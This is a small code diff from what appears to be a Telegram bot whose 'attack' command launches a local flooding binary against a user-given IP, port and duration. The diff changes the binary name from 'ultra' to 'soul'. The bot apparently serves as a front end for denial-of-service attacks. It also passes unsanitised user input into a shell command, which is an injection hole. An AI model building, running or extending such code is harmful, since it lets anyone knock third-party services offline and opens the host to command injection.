@@ -20,7 +20,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"🚀 Attack Started\n{ip}:{port}")
 
     process = await asyncio.create_subprocess_shell(
-        f"./ultra {ip} {port} {duration} 1200"
+        f"./soul {ip} {port} {duration} 1200"
     )
 
     await process.communicate()
